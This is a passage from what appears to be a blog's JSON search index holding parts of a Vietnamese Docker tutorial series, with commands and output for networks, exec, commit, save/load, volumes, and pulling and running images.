\u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;bdd19faad9cfe6ba9f49a532cf245b3a1bec95d8d20688f4c6b52018d45538b2\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B2\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;32f69c565c649791c9f70db3a7a224e6a8d882b41fb9dc7c6477d4f33b9ec32b\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:02\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.17.0.2/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; } }, \u0026#34;Options\u0026#34;: { \u0026#34;com.docker.network.bridge.default_bridge\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_icc\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_ip_masquerade\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.host_binding_ipv4\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;com.docker.network.bridge.name\u0026#34;: \u0026#34;docker0\u0026#34;, \u0026#34;com.docker.network.driver.mtu\u0026#34;: \u0026#34;1500\u0026#34; }, \u0026#34;Labels\u0026#34;: {} } ] Trong trường container đã có thêm container B3, và kiểm tra network mynetwork thì thấy B3 vẫn đang kết nối tới mynetwork.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 ❯ docker network inspect mynetwork [ { \u0026#34;Name\u0026#34;: \u0026#34;mynetwork\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;6c224f5d1a9819ba01d68ed6cd3a15357709d3b8dcf0b1ab0e289d11973f43d0\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2021-06-10T07:59:52.392658153+07:00\u0026#34;, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;EnableIPv6\u0026#34;: false, \u0026#34;IPAM\u0026#34;: { \u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;Options\u0026#34;: {}, \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.20.0.0/16\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.20.0.1\u0026#34; } ] }, \u0026#34;Internal\u0026#34;: false, \u0026#34;Attachable\u0026#34;: false, \u0026#34;Ingress\u0026#34;: false, \u0026#34;ConfigFrom\u0026#34;: { \u0026#34;Network\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;ConfigOnly\u0026#34;: false, \u0026#34;Containers\u0026#34;: { \u0026#34;1b39318c8d5b92261c22321f765945b85231160b53a9a3933b5fe120db80e7c2\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B4\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;5f26179cc819ffe9f6089c8de41cc236a36ce90c5ac646041d99de7d4a54d3e5\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:14:00:03\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.20.0.3/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;a7231f2ebe678e679ff063d0d8a09613a81db899ffb7e11eb6ba6c202e2e97d7\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B3\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;d8f6cf60953a1ebd7c1a84a95e5503bc726a5e77df2c939e8072fe6ca7406d65\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:14:00:02\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.20.0.2/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; } }, \u0026#34;Options\u0026#34;: {}, \u0026#34;Labels\u0026#34;: {} } ] Lúc này, B3 có thể kết nối tới B2 và B1 và ngược lại.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ❯ docker attach B1 / # ping 173.20.0.2 PING 173.20.0.2 (173.20.0.2): 56 data bytes 64 bytes from 173.20.0.2: seq=0 ttl=49 time=325.730 ms 64 bytes from 173.20.0.2: seq=1 ttl=49 time=297.840 ms 64 bytes from 173.20.0.2: seq=2 ttl=49 time=280.704 ms 64 bytes from 173.20.0.2: seq=3 ttl=49 time=328.708 ms 64 bytes from 173.20.0.2: seq=4 ttl=49 time=274.586 ms 64 bytes from 173.20.0.2: seq=5 ttl=49 time=295.232 ms 64 bytes from 173.20.0.2: seq=6 ttl=49 time=274.058 ms ^C --- 173.20.0.2 ping statistics --- 8 packets transmitted, 7 packets received, 12% packet loss round-trip min/avg/max = 274.058/296.694/328.708 ms Một lưu ý là khi B3 và B4 cùng kết nối với nhau qua một mạng, bên cạnh kết nối với nhau qua địa chỉ thì chúng có thể kết nối với nhau qua tên.\n1 2 3 4 5 6 7 8 9 10 11 ❯ docker attach B3 / # ping B4 PING B4 (172.20.0.3): 56 data bytes 64 bytes from 172.20.0.3: seq=0 ttl=64 time=0.283 ms 64 bytes from 172.20.0.3: seq=1 ttl=64 time=0.194 ms 64 bytes from 172.20.0.3: seq=2 ttl=64 time=0.164 ms 64 bytes from 172.20.0.3: seq=3 ttl=64 time=0.191 ms ^C --- B4 ping statistics --- 4 packets transmitted, 4 packets received, 0% packet loss round-trip min/avg/max = 0.164/0.208/0.283 ms Tuy nhiên B1, B2 cũng kết nối với nhau chung 1 mạng mà chúng không thể giao tiếp với nhau qua tên. Có thể do mạng của chúng cùng kết nối là mạng mặc định (bridge).\n1 2 3 ❯ docker attach B1 / # ping B2 ping: bad address \u0026#39;B2\u0026#39; Xóa mạng Khi không có nhu cầu sử dụng network nữa, chúng ta có thể xóa chúng đi với cú pháp:\ndocker network rm \u0026lt;ten_network\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ❯ docker network ls NETWORK ID NAME DRIVER SCOPE 286d5161c9f6 bridge bridge local 0f2ab02aa9f4 host host local 2f8c72e77060 mynetwork bridge local 258acbefb858 network1 bridge local 271997adaaa9 none null local ❯ docker network rm network1 network1 ❯ docker network ls NETWORK ID NAME DRIVER SCOPE 286d5161c9f6 bridge bridge local 0f2ab02aa9f4 host host local 2f8c72e77060 mynetwork bridge local 271997adaaa9 none null local Kết luận Trong bài học này, chúng ta đã học được từ anh XuanThuLabChanel những kiến thức như sau:\nBiết về busybox Các lệnh thao tác với docker network: liệt kê, kiểm tra thông tin mạng Mạng bridge, tạo thêm, xóa mạng, ánh xạ cổng mạng trong docker. Kết thúc bài viết này, một lần nữa em xin chân thành gửi lời cảm ơn đến anh XuanThuLabChanel đã làm những bài học quý giá và bổ ích này.\n","description":"Phần này chúng ta sẽ học về : Mạng | Networking trong Docker, tạo và quản lý network trong container Docker ","id":13,"section":"posts","tags":["Docker"],"title":"Tìm hiểu và sử dụng docker (P3)","uri":"https://minhlongmt183.github.io/posts/docker_p3/"},{"content":"\rToàn bộ series này được tham khảo từ hai nguồn chính: XuanThuLabChanel và DockerDoc. Em xin chân thành cảm ơn sự cống hiến của các tác giả của những kênh nói trên.❤️❤️❤️\rLệnh Docker exec, lưu container thành image với commit, xuất image ra file Docker exec Thông thường, để thực thi một lệnh trong container, ta sẽ vào container bằng lệnh docker attach \u0026lt;container name or id\u0026gt;. Tuy nhiên, nếu ta đang ở host và vẫn muốn thực thi một lệnh bên trong container đang chạy, ta sẽ dùng lệnh docker exec \u0026lt;container id / name\u0026gt; [COMMAND].\nVí dụ, từ host, ta chạy lệnh ls để liệt kê tất cả các file trong container.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 6d1aa3dda644 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 3 minutes ago Up 3 minutes test ❯ docker exec test ls bin boot dev etc home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var Ngoài ra cũng vẫn có thể thêm các option, ví dụ:\n1 2 ❯ docker exec -it test bash root@ubuntu1:/# Lệnh trên yêu cầu thực thi lệnh bash và thêm option -it để có thể tương tác trực tiếp với terminal, dễ dàng thấy, nó khá giống với lệnh docker attach, tuy nhiên, khi mở các process trong container bằng htop, chúng ta sẽ thấy như sau:\nRõ ràng, ở đây có ngoài process /bin/bash có khi tạo, container còn chạy thêm một process bash, process này chính là lệnh mà chúng ta yêu cầu thực thi từ máy host. Sau khi thực hiện lệnh docker exec -it test bash, ta gõ lệnh exit để thoát khỏi container, tuy nhiên, vì container vẫn còn process /bin/bash nên nó vẫn còn hoạt động chứ không bị tắt đi.\nDocker commit Sau khi cài docker và sử dụng, chúng ta có thể phải cài thêm nhiều phần mềm, môi trường khác nhau. Khi đó, để chia sẻ container này đi, ta cần lưu container này thành image. Để làm việc đó, ta sử dụng lệnh container commit.\nTrước khi lưu container trở thành image, ta kiểm tra xem trong hệ thống có những image nào:\n1 2 3 4 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB Một điều lưu ý, muốn lưu container thành image, thì container đó phải ở trạng thái dừng (Exited).\n1 2 3 4 ❯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 6d1aa3dda644 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 23 minutes ago Exited (0) 4 minutes ago test ddf68933af54 centos:latest \u0026#34;/bin/bash\u0026#34; 16 hours ago Exited (0) 16 hours ago centos_docker Tiến hành lưu container thành images, ta dùng cú pháp: docker commit CONTAINER image:tag. CONTAINER ở đây là tên hoặc id của container.\nVí dụ, container ubuntu vừa rồi tôi đã cài thêm ping với vim, bây giờ lưu lại thành image, ta thực hiện:\n1 2 3 4 5 6 7 ❯ docker commit test ubuntu-pv:version1 sha256:a8e04dcf8737519e456dcedd646983a5d69d97ea85f5e3517b537b2b1a86ef0a ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu-pv version1 a8e04dcf8737 5 seconds ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB Rõ ràng, sau khi thực hiện lệnh trên, chúng ta sẽ thấy trong danh sách các images có thểm một image có thên là ubuntu-py với TAG là version1 cùng ID và các thông tin khác.\nDocker save Sau khi ta lưu container thành một image, để có thể chia sẻ image này với người khác, ta lưu image thành một file trên máy host. Việc này sẽ được thực hiện thông qua lệnh docker save --output filename.tar \u0026lt;image_id/name\u0026gt;.\n1 2 3 4 5 6 7 8 9 10 ❯ ls \u0026#39;IDA Freeware.desktop\u0026#39; PinImage tmp ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu-pv version1 a8e04dcf8737 6 minutes ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB ❯ docker save --output ubuntu-pv.tar a8 ❯ ls \u0026#39;IDA Freeware.desktop\u0026#39; PinImage tmp ubuntu-pv.tar Ví dụ trên tôi đã lưu ubuntu-pv image thành ra file ubuntu-pv.tar.\nDocker load Sau khi nhận được file image.tar, để phục hồi hoặc sử dụng lại, ta sử dụng lệnh docker load -i image.tar\nVí dụ, tôi tiến hành xóa đi ubuntu-pv image hiện có trên hệ thống. Lệnh thao tác với image bạn có thể xem ở P1.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu-pv version1 a8e04dcf8737 11 minutes ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB ❯ docker image rm -f ubuntu-pv:version1 Untagged: ubuntu-pv:version1 Deleted: sha256:a8e04dcf8737519e456dcedd646983a5d69d97ea85f5e3517b537b2b1a86ef0a ❯ docker image rm ubuntu:latest Untagged: ubuntu:latest Untagged: ubuntu@sha256:adf73ca014822ad8237623d388cedf4d5346aa72c270c5acc01431cc93e18e2d Deleted: sha256:7e0aa2d69a153215c790488ed1fcec162015e973e49962d438e18249d16fa9bd ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE centos latest 300e315adb2f 6 months ago 209MB Bây giờ, ta tiến hành phục hồi ubuntu-pv image từ file ubuntu-pv.tar đã có ở trước đó.\n1 2 3 4 5 6 7 8 ❯ ls \u0026#39;IDA Freeware.desktop\u0026#39; PinImage tmp ubuntu-pv.tar ❯ docker load -i ubuntu-pv.tar Loaded image ID: sha256:a8e04dcf8737519e456dcedd646983a5d69d97ea85f5e3517b537b2b1a86ef0a ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; a8e04dcf8737 14 minutes ago 170MB centos latest 300e315adb2f 6 months ago 209MB Khi phục hồi, tên của image và tag của nó sẽ là \u0026lt;none\u0026gt;. Để đặt tên và tag, ta dùng lệnh:\ndocker tag image_id name:tag.\n❯ docker tag a8 newimage:version2\r❯ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rnewimage version2 a8e04dcf8737 16 minutes ago 170MB\rcentos latest 300e315adb2f 6 months ago 209MB Chia sẻ dữ liệu trong Docker, tạo và quản lý ổ đĩa docker volume Chia sẻ dữ liệu giữa máy host và container Trên máy host, tôi tổ chức cây thực mục như sau:\n1 2 3 4 . ├── docker │ └── data │ └── d.txt Mục tiêu của chúng ta là để container có thể truy cập và thao tác với dữ liệu ở trong data, và khi container bị xóa đi, dữ liệu không bị mất.\nChúng ta tạo mới một container và trong lúc tạo sẽ chỉ rõ thực mục ánh xạ trên host và thực mục được ánh xạ ở đâu trên container.\ndocker run -it -v \u0026lt;thu/muc/tren/host\u0026gt;:\u0026lt;thu/muc/anh/xa/tren/container\u0026gt; \u0026lt;image id\u0026gt;\n1 2 3 4 5 6 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 28 minutes ago 170MB centos latest 300e315adb2f 6 months ago 209MB ❯ docker run -it -v /home/edisc/Desktop/docker/data:/home/shared_data a8 root@d4d24f24bbe6:/# Chúng ta tiến hành kiểm tra:\n1 2 3 4 root@d4d24f24bbe6:/# cd /home/shared_data/ root@d4d24f24bbe6:/home/shared_data# ls d.txt root@d4d24f24bbe6:/home/shared_data# Như vậy, dữ liệu đã được ánh xạ và mọi thao tác trên dữ liệu ở thư mục này sẽ được lưu vào host.\nChia sẻ dữ liệu giữa các container với nhau Chúng ta tạo lại một container có tên là container1 ánh xạ tới dữ liệu Desktop/docker/data, và tạo một container2 muốn ánh xạ tới dự liệu này, thay vì dùng lệnh tạo như container1, ta có thể dùng --volumes-from \u0026lt;container_name/id\u0026gt;\n1 2 3 4 5 6 7 8 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 36 minutes ago 170MB centos latest 300e315adb2f 6 months ago 209MB ❯ docker run -it -v /home/edisc/Desktop/docker/data:/home/shared_data --name \u0026#34;container1\u0026#34; a8 root@b62e5d395369:/# % ❯ docker run -it --name container2 --volumes-from container1 centos [root@e1103acb0525 /]# Chia sẻ qua volume Bên cạnh việc chia sẻ dữ liệu bằng cách tạo các file dữ liệu, docker còn cho phép chúng ta tạo ra những ổ đĩa, gán vào container và để chia sẻ dữ liệu giữa chúng. Cũng như file, khi container xóa thì những ổ đĩa này vẫn còn tồn tại cho đến khi chúng ta cố tình xóa nó.\nKiểm tra các ổ đĩa hiện có Để kiểm tra các ổ đĩa hiện có, ta dùng lệnh:\n1 2 ❯ docker volume ls DRIVER VOLUME NAME Hiện tại trên hệ thống không có ổ đĩa nào.\nTạo ổ đĩa Để tạo một ổ đĩa mới, ta dùng lệnh: docker volume create NAMEDISK.\n1 2 3 4 5 ❯ docker volume create D1 D1 ❯ docker volume ls DRIVER VOLUME NAME local D1 Kiểm tra thông tin ổ đĩa Để kiểm tra thông tin ổ đĩa ta dùng lệnh docker volume inspect NAMEDISK.\n1 2 3 4 5 6 7 8 9 10 11 12 ❯ docker volume inspect D1 [ { \u0026#34;CreatedAt\u0026#34;: \u0026#34;2021-06-08T10:06:13+07:00\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Labels\u0026#34;: {}, \u0026#34;Mountpoint\u0026#34;: \u0026#34;/var/lib/docker/volumes/D1/_data\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;D1\u0026#34;, \u0026#34;Options\u0026#34;: {}, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34; } ] Xóa ổ đĩa Khi không có nhu cầu sử dụng, ta sử dụng lệnh docker volume rm NAMEDISK.\n1 2 3 4 5 6 7 8 9 ❯ docker volume ls DRIVER VOLUME NAME local D1 local D2 ❯ docker volume rm D1 D1 ❯ docker volume ls DRIVER VOLUME NAME local D2 Gán ổ đĩa volume vào container Ta sử dụng cú pháp:\ndocker run -it --mount source=DISK,target=pathContainer imageID\n1 2 3 4 5 6 7 8 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 About an hour ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB ❯ docker run -it --mount source=D2,target=/home/disk2 ubuntu:latest root@524a1182f690:/# cd /home/disk2/ root@524a1182f690:/home/disk2# Ta tiến hành thêm dữ liệu trong thư mục trên, sau đó xóa container đi, và thấy, ổ đĩa vẫn còn.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 About an hour ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB ❯ docker run -it --mount source=D2,target=/home/disk2 ubuntu:latest root@524a1182f690:/# cd /home/disk2/ root@524a1182f690:/home/disk2# ❯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 524a1182f690 ubuntu:latest \u0026#34;/bin/bash\u0026#34; About a minute ago Exited (0) 23 seconds ago cocky_mclaren e1103acb0525 centos \u0026#34;/bin/bash\u0026#34; 19 minutes ago Exited (127) 11 minutes ago container2 b62e5d395369 a8 \u0026#34;/bin/bash\u0026#34; 21 minutes ago Exited (0) 11 minutes ago container1 ❯ docker rm 52 52 ❯ docker volume ls DRIVER VOLUME NAME local D2 Vậy làm sao để truy xuất dữ liệu hiện có trên D2 hoặc kiểm tra xem có dữ liệu trên đó hay không? Để làm được điều đó, chúng ta tạo một container khác, mount tới D2 và kiểm tra.\n1 2 3 4 5 ❯ docker run -it --mount source=D2,target=/home/disk3 ubuntu:latest root@ca47e1855144:/# cd /home/disk3/ root@ca47e1855144:/home/disk3# ls data.txt root@ca47e1855144:/home/disk3# Dữ liệu do container trước đã tạo và lưu vào, dữ liệu này vẫn còn mặc dù container đã xóa đi.\nTạo ổ đĩa ánh xạ tới thư mục trên máy host. Cú pháp:\ndocker create --opt device =pathHOST --opt type=noe --opt o=bind DISKNAME\n1 2 3 4 5 6 ❯ docker volume create --opt device=/home/edisc/Desktop/docker/data --opt type=none --opt o=bind DISK1 DISK1 ❯ docker volume ls DRIVER VOLUME NAME local D2 local DISK1 Thông tin ổ đĩa có được như sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ❯ docker volume inspect DISK1 [ { \u0026#34;CreatedAt\u0026#34;: \u0026#34;2021-06-08T10:27:56+07:00\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Labels\u0026#34;: {}, \u0026#34;Mountpoint\u0026#34;: \u0026#34;/var/lib/docker/volumes/DISK1/_data\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;DISK1\u0026#34;, \u0026#34;Options\u0026#34;: { \u0026#34;device\u0026#34;: \u0026#34;/home/edisc/Desktop/docker/data\u0026#34;, \u0026#34;o\u0026#34;: \u0026#34;bind\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;none\u0026#34; }, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34; } ] Để chạy container với tham số này ta không sử dụng tùy chọn --mount mà ta sẽ sủ dụng tùy chọn -v.\n1 2 3 4 5 6 7 8 9 10 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 About an hour ago 170MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB ❯ docker run -it -v DISK1:/home/disk4 ubuntu:latest root@e94027a36d5b:/# cd /home/disk4/ root@e94027a36d5b:/home/disk4# ls c1.txt d.txt data_container2.txt root@e94027a36d5b:/home/disk4# Vào thư mục và kiểm tra, ta vẫn thấy nó có các dữ liệu ở trên máy host. Và khi thao tác dữ liệu trên này, dữ liệu trên máy host cũng sẽ được cập nhât.\nKết luận Trong bài học này, chúng ta đã học được từ anh XuanThuLabChanel những kiến thức như sau: Các lệnh Docker exec, lưu container thành image với commit, xuất image ra file:\ndocker exec: thực thi một lệnh bên trong container đang chạy từ host. docker commit: lưu container thành image docker save: lưu image thành file. docker load: chuyển file thành image.\nChia sẻ dữ liệu trong Docker, tạo và quản lý ổ đĩa docker volume: Chia sẻ dữ liệu qua tệp: Container với host Giữa container với nhau. Chia sẻ dữ liệu qua ổ đĩa disk: các thao tác với volume thông qua lệnh docker volume kèm các option tương ứng.\nKết thúc bài viết này, một lần nữa em xin chân thành gửi lời cảm ơn đến anh XuanThuLabChanel đã làm những bài học quý giá và bổ ích này. ","description":"Phần này chúng ta sẽ tìm hiểu lệnh Docker exec, lưu container thành image với commit, xuất image ra file; Chia sẻ dữ liệu trong Docker, tạo và quản lý ổ đĩa docker volume ","id":14,"section":"posts","tags":["Docker"],"title":"Tìm hiểu và sử dụng docker (P2)","uri":"https://minhlongmt183.github.io/posts/docker_p2/"},{"content":"\rToàn bộ series này được tham khảo từ hai nguồn chính: XuanThuLabChanel và DockerDoc. Em xin chân thành cảm ơn sự cống hiến của các tác giả của những kênh nói trên.❤️❤️❤️\rLàm quen với docker command line Khi làm việc với docker, lệnh chúng ta hay dùng đó chính là docker. Sau lệnh docker sẽ có nhiều lệnh nhỏ, để xem danh sách các lệnh nhỏ này, ta gõ\n1 $ docker 1 $ docker run -d -p 80:80 docker/getting-started Trong đó:\n-d: chạy container ở chế độ detached mode (ở background) -p 80:80: ánh xạ cổng 80 của host vào cổng 80 của container. docker/getting-started: image sử dụng Docker images Liệt kê các images 1 2 3 4 5 6 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE debian latest 4a7a1f401734 3 weeks ago 114MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB docker/getting-started latest 3ba8f2ff0727 2 months ago 27.9MB hello-world latest d1165f221234 3 months ago 13.3kB Ở đây,\nREPOSITORY là tên của image, TAG là phiên bản của image, IMAGE ID là một mã hash của image, CREATED là thời gian được tạo của image, SIZE là kích thước của image.\nCác images này lấy từ hub.docker.com. Chúng ta vào hub.docker.com để tìm kiếm image thích hợp mà mình muốn tải. Lưu ý nếu lần đầu bạn vào trang này, bạn cần đăng kí một tài khoản. Ngoài ra, ta có thể tìm kiếm trực tiếp trên terminal với lệnh: 1 docker search \u0026lt;keyword\u0026gt; Ví dụ, ta muốn tìm kiếm các images của ubuntu\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 ❯ docker search ubuntu NAME DESCRIPTION STARS OFFICIAL AUTOMATED ubuntu Ubuntu is a Debian-based Linux operating sys… 12337 [OK] dorowu/ubuntu-desktop-lxde-vnc Docker image to provide HTML5 VNC interface … 539 [OK] websphere-liberty WebSphere Liberty multi-architecture images … 273 [OK] rastasheep/ubuntu-sshd Dockerized SSH service, built on top of offi… 253 [OK] consol/ubuntu-xfce-vnc Ubuntu container with \u0026#34;headless\u0026#34; VNC session… 241 [OK] ubuntu-upstart Upstart is an event-based replacement for th… 110 [OK] 1and1internet/ubuntu-16-nginx-php-phpmyadmin-mysql-5 ubuntu-16-nginx-php-phpmyadmin-mysql-5 50 [OK] open-liberty Open Liberty multi-architecture images based… 46 [OK] ubuntu-debootstrap debootstrap --variant=minbase --components=m… 44 [OK] i386/ubuntu Ubuntu is a Debian-based Linux operating sys… 25 nuagebec/ubuntu Simple always updated Ubuntu docker images w… 24 [OK] solita/ubuntu-systemd Ubuntu + systemd 24 [OK] 1and1internet/ubuntu-16-apache-php-5.6 ubuntu-16-apache-php-5.6 14 [OK] 1and1internet/ubuntu-16-apache-php-7.0 ubuntu-16-apache-php-7.0 13 [OK] 1and1internet/ubuntu-16-nginx-php-phpmyadmin-mariadb-10 ubuntu-16-nginx-php-phpmyadmin-mariadb-10 11 [OK] 1and1internet/ubuntu-16-nginx-php-5.6-wordpress-4 ubuntu-16-nginx-php-5.6-wordpress-4 9 [OK] 1and1internet/ubuntu-16-nginx-php-5.6 ubuntu-16-nginx-php-5.6 8 [OK] 1and1internet/ubuntu-16-apache-php-7.1 ubuntu-16-apache-php-7.1 7 [OK] 1and1internet/ubuntu-16-nginx-php-7.0 ubuntu-16-nginx-php-7.0 4 [OK] pivotaldata/ubuntu A quick freshening-up of the base Ubuntu doc… 4 pivotaldata/ubuntu16.04-build Ubuntu 16.04 image for GPDB compilation 2 pivotaldata/ubuntu-gpdb-dev Ubuntu images for GPDB development 1 smartentry/ubuntu ubuntu with smartentry 1 [OK] 1and1internet/ubuntu-16-sshd ubuntu-16-sshd 1 [OK] 1and1internet/ubuntu-16-php-7.1 ubuntu-16-php-7.1 1 [OK] Mục OFFICIAL cho biết phiên bản này là chính chủ. Để sử dụng một image nào đó, chúng ta cần đọc thông tin của image trên hub.docker và các phiển bản của image nằm ở phần tag.\nTải image Để tải image, ta sử dụng:\n1 docker pull image:tag Ở đây, tag là phiên bản mà chúng ta muốn sử dụng. Nếu chúng ta muốn tải bản ubuntu 20.04 thì câu lệnh sẽ là:\n1 2 3 4 ❯ docker pull ubuntu:20.04 20.04: Pulling from library/ubuntu Digest: sha256:adf73ca014822ad8237623d388cedf4d5346aa72c270c5acc01431cc93e18e2d Status: Downloaded newer image for ubuntu:20.04 Chúng ta kiểm tra lại để xác nhận docker đã được tải bằng lệnh docker images\n1 2 3 4 5 6 7 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE debian latest 4a7a1f401734 3 weeks ago 114MB ubuntu 20.04 7e0aa2d69a15 6 weeks ago 72.7MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB docker/getting-started latest 3ba8f2ff0727 2 months ago 27.9MB hello-world latest d1165f221234 3 months ago 13.3kB Khi chúng ta không để tag, mặc định nó xem như tag này là latest và sẽ tải bản mới nhất về, và khi chúng ta in ra các images, những images này sẽ có tag là latest.\n1 2 3 4 5 6 ❯ docker pull centos Using default tag: latest latest: Pulling from library/centos 7a0437f04f83: Pull complete Digest: sha256:5528e8b1b1719d34604c87e11dcd1c0a20bedf46e83b5632cdeac91b8c04efc1 Status: Downloaded newer image for centos:latest Xóa Image Để xóa một image không sử dụng, chúng ta dùng câu lệnh:\n1 docker image rm \u0026lt;ten_image_muon_xoa:tag\u0026gt; Ví dụ, tôi muốn xóa image ubuntu:20.04, ta làm như sau:\n1 2 ❯ docker image rm ubuntu:20.04 Untagged: ubuntu:20.04 Kết quả sau khi xóa:\n1 2 3 4 5 6 ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE debian latest 4a7a1f401734 3 weeks ago 114MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB docker/getting-started latest 3ba8f2ff0727 2 months ago 27.9MB hello-world latest d1165f221234 3 months ago 13.3kB Ngoài ra, chúng ta còn có thể xóa bằng cách dùng IMAGE ID, ví dụ, ta muốn xóa image hello-world,\n1 2 3 4 5 6 7 8 9 10 ❯ docker image rm d1165f221234 Untagged: hello-world:latest Untagged: hello-world@sha256:5122f6204b6a3596e048758cabba3c46b1c937a46b5be6225b835d091b90e46c Deleted: sha256:d1165f2212346b2bab48cb01c1e39ee8ad1be46b87873d9ca7a4e434980a7726 Deleted: sha256:f22b99068db93900abe17f7f5e09ec775c2826ecfe9db961fea68293744144bd ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE debian latest 4a7a1f401734 3 weeks ago 114MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB docker/getting-started latest 3ba8f2ff0727 2 months ago 27.9MB Docker version Usage 1 $ docker version [OPTIONS] Get the server version 1 $ docker version --format \u0026#39;{{.Server.Version}}\u0026#39; Dump raw JSON data 1 $ docker version --format \u0026#39;{{json .}}\u0026#39; Print the current context 1 $ docker version --format=\u0026#39;{{.Client.Context}}\u0026#39; Docker run Image sẽ đươc chạy trong các container, để chạy ta thực hiện câu lệnh:\nUsage: 1 $ docker run [OPTIONS] IMAGE [COMMAND] [ARG...] Có rất nhiều tham số, các bạn có thể đọc ở đây Ví dụ: Chạy một image 1 docker run -it \u0026lt;ten_image/image_id\u0026gt; Ở đây, -it là viết gọn của 2 options: -i (interactive) và -t (terminal) chỉ định tạo ra container và có thể tương tác với nó trực tiếp trên terminal. Giả sử ta chạy image ubuntu:latest.\n1 2 ❯ docker run -it ubuntu:latest root@b2d8e983bcef:/# Vậy là chúng ta đã chạy image ubuntu:latest và đang ở container ubuntu, 